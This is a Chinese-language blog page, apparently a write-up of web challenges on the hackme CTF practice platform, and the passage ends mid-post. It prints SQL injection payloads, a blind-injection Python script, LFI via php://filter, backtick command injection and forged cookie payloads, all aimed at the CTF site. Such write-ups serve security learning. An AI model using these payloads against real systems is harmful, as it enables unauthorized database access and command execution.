@@ -1,0 +1,1576 @@
+<!DOCTYPE html>
+
+
+
+  
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon-32x32-next.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sql注入,ssrf,xss,代码审计,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="LJH's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="关于hackme web wp">
+<meta name="keywords" content="sql注入,ssrf,xss,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackme web wp">
+<meta property="og:url" content="https://museljh.github.io/2019/02/14/hackme web wp/index.html">
+<meta property="og:site_name" content="LJH&#39;s blog">
+<meta property="og:description" content="关于hackme web wp">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://museljh.github.io/images/fly.png">
+<meta property="og:image" content="https://i.imgur.com/0EE9Ldx.png">
+<meta property="og:image" content="https://i.imgur.com/ttMjVLC.png">
+<meta property="og:image" content="https://i.imgur.com/eNHrynx.png">
+<meta property="og:image" content="https://i.imgur.com/jAjs9HZ.png">
+<meta property="og:image" content="https://i.imgur.com/havNdqe.png">
+<meta property="og:image" content="https://i.imgur.com/jJ3nmvn.png">
+<meta property="og:image" content="https://i.imgur.com/Fs02EmI.png">
+<meta property="og:image" content="https://i.imgur.com/c9di8pW.png">
+<meta property="og:image" content="https://i.imgur.com/LG5Pp85.png">
+<meta property="og:image" content="https://i.imgur.com/CxXwp3r.png">
+<meta property="og:image" content="https://i.imgur.com/Yy6j0a6.png">
+<meta property="og:image" content="https://i.imgur.com/xIpQsjD.png">
+<meta property="og:image" content="https://i.imgur.com/xCW1UM2.png">
+<meta property="og:image" content="https://i.imgur.com/p969kJx.png">
+<meta property="og:image" content="https://i.imgur.com/VZUNTwq.png">
+<meta property="og:image" content="https://i.imgur.com/T8QjfBR.png">
+<meta property="og:image" content="https://i.imgur.com/1y2N2Hy.png">
+<meta property="og:image" content="https://i.imgur.com/vhHtQqL.png">
+<meta property="og:image" content="https://i.imgur.com/flDWZWG.png">
+<meta property="og:image" content="https://i.imgur.com/X8jzhT4.png">
+<meta property="og:image" content="https://i.imgur.com/ceXi9hm.png">
+<meta property="og:image" content="https://i.imgur.com/xhQIW6V.png">
+<meta property="og:image" content="https://i.imgur.com/pq71E0H.png">
+<meta property="og:image" content="https://i.imgur.com/ARAmxYX.png">
+<meta property="og:image" content="https://i.imgur.com/zPM5fKH.png">
+<meta property="og:image" content="https://i.imgur.com/lQQtPt1.png">
+<meta property="og:image" content="https://i.imgur.com/w5vRrVH.png">
+<meta property="og:image" content="https://i.imgur.com/Eo1WbAl.png">
+<meta property="og:image" content="https://i.imgur.com/CkDdW1h.png">
+<meta property="og:image" content="https://i.imgur.com/3EYEggR.png">
+<meta property="og:image" content="https://i.imgur.com/fUjyh1I.png">
+<meta property="og:image" content="https://i.imgur.com/5HqO3M9.png">
+<meta property="og:image" content="https://i.imgur.com/RNDy0hC.png">
+<meta property="og:image" content="https://i.imgur.com/lcOzYLt.png">
+<meta property="og:image" content="https://i.imgur.com/RSb92f2.png">
+<meta property="og:image" content="https://i.imgur.com/BADXyTr.png">
+<meta property="og:image" content="https://i.imgur.com/YJr2kYV.png">
+<meta property="og:image" content="https://i.imgur.com/HumhOH8.png">
+<meta property="og:image" content="https://i.imgur.com/PZ1K584.png">
+<meta property="og:image" content="https://i.imgur.com/eAWnZwB.png">
+<meta property="og:image" content="https://i.imgur.com/eF3gL6H.png">
+<meta property="og:image" content="https://i.imgur.com/vkh2zJc.png">
+<meta property="og:image" content="https://i.imgur.com/5Bre5Xj.png">
+<meta property="og:image" content="https://i.imgur.com/buLS911.png">
+<meta property="og:image" content="https://i.imgur.com/hyOwRmW.png">
+<meta property="og:image" content="https://i.imgur.com/dMWZdPy.png">
+<meta property="og:image" content="https://i.imgur.com/UGmTBKE.png">
+<meta property="og:image" content="https://i.imgur.com/SJTpKbU.png">
+<meta property="og:image" content="https://i.imgur.com/DtuLg7P.png">
+<meta property="og:image" content="https://i.imgur.com/LOGowLr.png">
+<meta property="og:image" content="https://i.imgur.com/fbb5tmJ.png">
+<meta property="og:image" content="https://i.imgur.com/LbPiMsm.png">
+<meta property="og:image" content="https://i.imgur.com/FdhOBvM.png">
+<meta property="og:image" content="https://i.imgur.com/OX5JV0I.png">
+<meta property="og:image" content="https://i.imgur.com/UD2y2yU.png">
+<meta property="og:image" content="https://i.imgur.com/8zSWBBR.png">
+<meta property="og:image" content="https://i.imgur.com/Y83jQAl.png">
+<meta property="og:image" content="https://i.imgur.com/4e4LZAa.png">
+<meta property="og:image" content="https://i.imgur.com/7GbcWoX.png">
+<meta property="og:image" content="https://i.imgur.com/EcXUBAG.png">
+<meta property="og:image" content="https://i.imgur.com/T5uAmTs.png">
+<meta property="og:image" content="https://i.imgur.com/6M5yDFA.png">
+<meta property="og:image" content="https://i.imgur.com/pkPYbsE.png">
+<meta property="og:image" content="https://i.imgur.com/g99DGuY.png">
+<meta property="og:image" content="https://i.imgur.com/qKmQXts.png">
+<meta property="og:updated_time" content="2019-02-14T13:08:46.747Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hackme web wp">
+<meta name="twitter:description" content="关于hackme web wp">
+<meta name="twitter:image" content="https://museljh.github.io/images/fly.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://museljh.github.io/2019/02/14/hackme web wp/">
+
+
+
+
+
+  <title>hackme web wp | LJH's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+<a href="https://github.com/MuseLJH" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+  <div class=" page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LJH's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">LJHX's blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://museljh.github.io/2019/02/14/hackme web wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LJH">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LJH's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hackme web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-14T20:38:07+08:00">
+                2019-02-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/02/14/hackme web wp/" class="leancloud_visitors" data-flag-title="hackme web wp">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  21
+                </span>
+              
+            </div>
+          
+
+          
+              <div class="post-description">
+                  关于hackme web wp
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="/images/fly.png" alt=""></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hack me 很不错的一个ctf平台，有些题目质量很高</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1-捉迷藏"><a href="#1-捉迷藏" class="headerlink" title="1.捉迷藏"></a>1.捉迷藏</h3><p>直接F12 输入flag字符查找</p>
+<h3 id="2-留言"><a href="#2-留言" class="headerlink" title="2.留言"></a>2.留言</h3><blockquote>
+<p>提示：这本留言簿很糟糕。sqlmap是你的朋友。<br>说明可以直接使用sqlmap</p>
+</blockquote>
+<p><img src="https://i.imgur.com/0EE9Ldx.png" alt=""><br>这边应该是可以注入的，<br>使用’会报错，使用’#就不会报错<br>大概它的语句是select xxx from xxx where xxx=’$xx’;<br>由于页面只会显示success与false估计只能使用布尔盲注了<br>但是我’ union select 1,2,3,database()# 却会报错<br>（后来想下这估计是使用insert注入…一开始我直接想当然以为它是select）<br>原因未知，使用下sqlmap试试<br>使用sqlmap貌似不可以，可能有什么黑名单之类的过滤。<br><img src="https://i.imgur.com/ttMjVLC.png" alt=""><br>这边的id参数也是可以注入的<br>直接使用联合注入方式<br>payload<br>爆数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0%20union%20select%201,2,3,database()#</span><br></pre></td></tr></table></figure></p>
+<p>直接查出数据库是g8<br>爆表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20TABLE_NAME%20from%20information_schema.TABLES%20where%20TABLE_SCHEMA=%27g8%27%20limit%200,1),4#</span><br></pre></td></tr></table></figure></p>
+<p>查出表为flag<br>爆列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20COLUMN_NAME%20from%20information_schema.COLUMNS%20where%20TABLE_NAME=%27flag%27%20limit%201,1),4#</span><br></pre></td></tr></table></figure></p>
+<p>还是flag<br>爆flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20flag%20from%20flag%20limit%201,1),4#</span><br></pre></td></tr></table></figure></p>
+<p>FLAG=<br>出来了</p>
+<blockquote>
+<p>(注：这边id=0是为了让第一个查询结果为空，不然是查询不出结果的)<br>尝试了下能不能用报错注入，不过没有错误信息所以不可以，盲注应该也是可以的我就不演示了。</p>
+</blockquote>
+<h3 id="3-LFI"><a href="#3-LFI" class="headerlink" title="3.LFI"></a>3.LFI</h3><blockquote>
+<p>这个管理员的密码是什么？这根本不重要，只要拿到旗帜。<br>提示：LFI，php://filter</p>
+</blockquote>
+<p><img src="https://i.imgur.com/eNHrynx.png" alt=""><br>看下源码发现hint<br>显然这是要我们读取pages/flag这个文件<br><img src="https://i.imgur.com/jAjs9HZ.png" alt=""><br>直接试试嘿嘿。<br>这个？page估计是文件读取类似于file=xxx<br>根据题目提示：hp://filter<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</span><br></pre></td></tr></table></figure></p>
+<p>直接爆出一段base64<br>解码获得<br>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p>
+<blockquote>
+<p>php://filter/read=convert.base64-encode/resource=<br>可以将文件以base64的形式读取<br>这应该是要我们读取config文件<br>尝试下<br>爆出一段base64码<br>解码获得</p>
+</blockquote>
+<p>$flag = </p>
+<h3 id="4-主页"><a href="#4-主页" class="headerlink" title="4.主页"></a>4.主页</h3><blockquote>
+<p>国旗在哪里？你检查过代码了吗？<br>这题又是查看源码<br>但是find flag 只有第一题的flag<br>后来查了下原来这里有flag（一开始我还以为是乱码）</p>
+</blockquote>
+<blockquote>
+<p><a href="https://hackme.inndy.tw/cute.js" target="_blank" rel="noopener">https://hackme.inndy.tw/cute.js</a></p>
+</blockquote>
+<p>可以使用aadecode进行解密</p>
+<h3 id="5-ping"><a href="#5-ping" class="headerlink" title="5.ping"></a>5.ping</h3><blockquote>
+<p>你能ping 127.0.0.1吗？</p>
+</blockquote>
+<p>进入题目发现一段源码<br><img src="https://i.imgur.com/havNdqe.png" alt=""><br>这段代码大概意思应该是输入ip且里面不能含有数组中的字段，最后会返回 ping后的内容<br>试试127.0.0.1试试<br><img src="https://i.imgur.com/jJ3nmvn.png" alt=""><br>没有得到什么有用的信息<br>那么应该就要绕过黑名单，实现命令执行<br>linux下多行命令</p>
+<blockquote>
+<p>在使用UNIX命令时，系统为了提高使用的灵活性，支持多种命令输入的方式。例如，当需要完成多个命令且命令执行期间不需要人工干预时，可将多个命令写在同一个命令行中，命令之间用分号（；）隔开<br>如：pwd；ls -l </p>
+</blockquote>
+<p>本来想这样试试的，结果貌似被过滤了，<br>试试其他方法</p>
+<blockquote>
+<p><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a><br><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>
+</blockquote>
+<p>使用(反单引号)试试</p>
+<blockquote>
+<p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p>
+</blockquote>
+<p><code>ls</code>后<br><img src="https://i.imgur.com/Fs02EmI.png" alt=""><br>试试其他方式,$(ls) 貌似也可以，其他的暂时没找到<br>然后构造?ip=<code>more *</code>拿到flag<br>在linux文件读取方式很多如tac，tail等等</p>
+<h3 id="6-记分牌"><a href="#6-记分牌" class="headerlink" title="6.记分牌"></a>6.记分牌</h3><p>在header头部有flag</p>
+<h3 id="7-以管理员身份登录0"><a href="#7-以管理员身份登录0" class="headerlink" title="7.    以管理员身份登录0"></a>7.    以管理员身份登录0</h3><blockquote>
+<p>   提示：SQL注入！</p>
+</blockquote>
+<p>之间点击souce_code获取源码<br><img src="https://i.imgur.com/c9di8pW.png" alt=""><br>发现它对于‘会有转译，我们只要/’将它的转译转译就可以了<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos; union select 1,2,3,4#</span><br></pre></td></tr></table></figure></p>
+<p>原先我用admin/‘ || 1=1 # 嗯它可能变成为admin<br>get flag</p>
+<h3 id="8-以管理员身份登录0-1"><a href="#8-以管理员身份登录0-1" class="headerlink" title="8.    以管理员身份登录0.1"></a>8.    以管理员身份登录0.1</h3><p>貌似和上题一模一样，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;\&apos; UNION SELECT &quot; #&#125;, flag2 in the database!</span><br></pre></td></tr></table></figure></p>
+<p>这么说我们要查询数据库了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;union select 1,1,1,database()#</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/LG5Pp85.png" alt=""></p>
+<p>发现没有反应，这里应该是要盲注了我这么想<br>结果直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure></p>
+<p>发现貌似爆出的表<br>Hi, h1dden_f14g,user<br>难道数据库叫做1？？？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos; union  select 1,the_f14g,3,4 from h1dden_f14g#</span><br></pre></td></tr></table></figure></p>
+<p>得出flag</p>
+<h3 id="9-以管理员身份登录1"><a href="#9-以管理员身份登录1" class="headerlink" title="9.    以管理员身份登录1"></a>9.    以管理员身份登录1</h3><blockquote>
+<p>   请以管理员身份登录。<br>提示：SQL注入但sqlmap不再工作。<br>更新：源代码现已上市。</p>
+</blockquote>
+<p>扫描仪无法工作<br>说明还是sql注入 但是不能直接使用sqlmap<br><img src="https://i.imgur.com/CxXwp3r.png" alt=""><br>过滤函数，<br>过滤了空格<br>空格绕过</p>
+<blockquote>
+<p>%09 TAB键（水平）<br>/**/<br>%0a 新建一行<br>%0c 新的一页<br>%0d return功能<br>%0b TAB键（垂直）<br>%a0 空格</p>
+</blockquote>
+<p>\‘来绕过单引号<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;/**/union/**/select/**/1,2,3,4/**/#</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/Yy6j0a6.png" alt=""></p>
+<h3 id="10-login-as-admin-1-2"><a href="#10-login-as-admin-1-2" class="headerlink" title="10.login as admin 1.2"></a>10.login as admin 1.2</h3><p>和上题貌似是一样的（吐槽下，这个ctf平台真的是利用资源阿）<br>题目提示要使用盲注<br>我们先联合注入一波试试<br><img src="https://i.imgur.com/xIpQsjD.png" alt=""><br>失败<br>看来只能盲注了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#求数据库的名字</span><br><span class="line">url = &quot;https://hackme.inndy.tw/login1/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload = &quot;\\&apos;/**/or/**/(ascii(substr((select/**/SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/limit/**/0,1),%s,1))=%s)/**/limit/**/0,1#&quot;%(i,j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;name&quot;:payload,</span><br><span class="line">            &quot;password&quot;:&quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        print payload</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        if &quot;You are not admin!&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
+<p>跑到怀疑人生还是不跑了</p>
+<h3 id="11-login-as-admin-3"><a href="#11-login-as-admin-3" class="headerlink" title="11.login as admin 3"></a>11.login as admin 3</h3><p><img src="https://i.imgur.com/xCW1UM2.png" alt=""><br>想要爆出flag，cookie中的$user[‘admin’] 要为true<br>从上往下看<br>如果没有cookie的话就继续进行<br><img src="https://i.imgur.com/p969kJx.png" alt=""><br>验证<br>但是如果有cookie的话<br>如果不满足<br><img src="https://i.imgur.com/VZUNTwq.png" alt=""><br>就会报错<br>这了我们要利用，php弱比较，构造sig=0，负负得真绕过限制<br>根据set_users构造cookie形式<br><img src="https://i.imgur.com/T8QjfBR.png" alt=""><br>{“sig”:0,”data”:”[\”admin\”,true]”}<br>进行base64加密，构造payload<br><img src="https://i.imgur.com/1y2N2Hy.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=</span><br></pre></td></tr></table></figure>
+<h3 id="12-login-as-admin-4"><a href="#12-login-as-admin-4" class="headerlink" title="12.login as admin 4"></a>12.login as admin 4</h3><p>看源码，这次得源码很短<br><img src="https://i.imgur.com/vhHtQqL.png" alt=""><br>需要$_POST[‘name’] === ‘admin’<br>看看前面<br><img src="https://i.imgur.com/flDWZWG.png" alt=""><br>如果我们<br>$_POST[‘name’] === ‘admin’<br>就需要$_POST[‘password’] !== $password 不然后面<br>Location: ./?failed=1 就会跳转到failed=1<br><img src="https://i.imgur.com/X8jzhT4.png" alt=""><br>会登入失败<br>但我们并不知道$password 是什么<br>这个应该包含的config.php中<br><img src="https://i.imgur.com/ceXi9hm.png" alt=""><br>那该怎么办呢？<br>我们只要用一个工具使得能够不跳转就直接看到后面的flag<br>这里我们使用curl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &apos;name=damin&apos; https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure></p>
+<h3 id="13-login-as-admin-6"><a href="#13-login-as-admin-6" class="headerlink" title="13.login as admin 6"></a>13.login as admin 6</h3><p>看看源码<br><img src="https://i.imgur.com/xhQIW6V.png" alt=""><br>这里依旧是要满足<br>$user == ‘admin’<br><img src="https://i.imgur.com/pq71E0H.png" alt=""><br>一看到extrat函数<br>立马想能不能使用变量覆盖呢？<br>并且貌似strcmp($users[$username], $password) == 0)<br>里面函数变量是可控的，能不能尝试命令执行呢？<br>首先是变量覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &apos;data=&#123;&quot;user&quot;: &quot;admin&quot;&#125;&apos; https://hackme.inndy.tw/login6/</span><br></pre></td></tr></table></figure></p>
